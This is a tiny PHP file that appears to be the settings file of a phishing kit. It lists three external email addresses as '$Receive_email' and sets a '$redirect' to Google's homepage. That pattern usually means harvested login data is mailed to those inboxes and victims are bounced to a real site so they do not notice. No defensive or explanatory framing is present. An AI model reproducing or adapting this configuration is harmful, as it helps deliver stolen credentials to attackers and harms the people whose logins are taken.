<?php 
$Receive_email="yondawella@protonmail.com,jasonsamuei2@tutanota.com,jasonsamuei2@mail.com";
$redirect="https://www.google.com/";
?>